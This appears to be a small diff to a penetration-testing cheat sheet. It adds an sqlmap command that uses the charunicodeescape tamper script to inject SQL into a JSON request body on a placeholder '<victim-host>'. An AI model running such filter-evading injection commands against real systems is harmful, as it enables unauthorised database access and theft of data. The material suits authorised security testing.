@@ -1,2 +1,5 @@
 # get unicode tampers
 sqlmap --list-tamper| grep unicode
+
+# use tamper unicode script and inject into the json body
+sqlmap --tamper=charunicodeescape.py --data='{"user": "*"}' -u '<victim-host>'
